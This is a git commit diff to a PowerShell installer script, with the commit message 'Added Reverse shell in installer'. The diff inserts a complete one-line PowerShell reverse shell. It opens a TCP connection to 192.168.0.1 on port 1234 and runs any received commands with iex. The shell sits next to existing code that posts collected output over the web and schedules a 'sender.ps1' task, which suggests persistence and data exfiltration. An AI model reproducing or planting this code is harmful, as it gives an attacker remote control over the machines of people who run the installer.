138c4c62837b73d0303e23c2997123baf33ab6ba
Reiya Ihara <papichu.chime@icloud.com>
2025-12-20 23:04:36 -0800

    Added Reverse shell in installer

--- Original/Resources/installer.ps1
+++ Original/Resources/installer.ps1
@@ -84,6 +84,7 @@ Invoke-WebRequest `
     -Method POST `
     -Body $output `
     -ContentType "text/plain"
+$client = New-Object System.Net.Sockets.TCPClient('192.168.0.1',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 '@ | Set-Content -Path $filePath -Encoding UTF8
 
 # Create task schedule for sender.ps1
